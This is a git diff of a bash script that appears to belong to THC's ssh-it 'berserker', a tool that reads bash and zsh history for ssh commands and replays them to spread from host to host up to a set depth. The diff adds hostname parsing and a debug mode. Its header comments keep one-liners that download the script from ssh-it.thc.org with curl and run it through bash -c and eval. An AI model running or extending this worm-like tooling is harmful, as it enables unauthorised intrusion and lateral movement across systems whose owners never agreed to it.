@@ -7,6 +7,12 @@
 #      bash -c "$(cat bs)"
 #      export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "$BS"
 #      bash -c "IFS='' BS=\"\$(curl -fsSL ssh-it.thc.org/bs)\" && eval \$BS"
+#
+# BS_DEPTH=8       The depth before the berseker stops
+# THC_DEBUG=1      Enable debug output
+# BS_HISTFILE=     The bash history file to use
+# BS_ZSH_HISTFILE= The zsh history file to use
+
 # If this case we can not source funcs and must hope that BS contains ourself.
 BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
 if [[ "$0" != "bash" ]]; then
@@ -89,6 +95,7 @@ ssh_key_add()
 ssh_from_history()
 {
 	local oa
+	local hname
 	shift 1 # first arg is 'ssh'
 	
 	IFS=" "
@@ -128,6 +135,25 @@ ssh_from_history()
 	shift $((OPTIND - 1))
 	[[ -z $1 ]] && return
 
+	# ssh @foobar.com
+	[[ "$1" = @* ]] && { DEBUGF "Bad User in '$1'"; return; }
+	# $1 is the user@HOSTNAME.
+	# Extract hostname after @ or keep string if it does not contain '@'
+	#   server
+	#   user@server
+	#   Result: hname="server"
+	hname=${1#*@}
+
+	# Check if hname is valid.
+	[[ -z $hname ]] && { DEBUGF "Contains no hostname: '$1'"; return; }
+	if [[ "$hname" =~ [a-zA-Z] ]]; then
+		# HERE: It's a domain name.
+		# Ignore if invalid characters
+		[[ "$hname" =~ [:/] ]] && { DEBUGF "Hostname contains illegal characters: '$1'"; return; }
+	elif [[ "$hname" =~ [0-9] ]]; then
+		# IP or IPv6 address
+		[[ "$hname" =~ [^0-9.:] ]] && { DEBUGF "Hostname contains illegal characters for an IP: '$1'"; return; }
+	fi
 	CMD+="$1"
 	[[ "${CMD_LIST[*]}" = *"$CMD"* ]] && { DEBUGF "SKIP $CMD"; return; }
 	CMD_LIST+=("$CMD")
@@ -457,6 +483,13 @@ n_failed=0
 n_success=0
 n=0
 
+[[ -n $THC_DEBUG ]] && {
+for c in "${CMD_LIST[@]}"; do
+	DEBUGF "Trying '$c'"
+	continue
+done
+exit
+}
 
 for c in "${CMD_LIST[@]}"; do
 	n=$((n+=1))
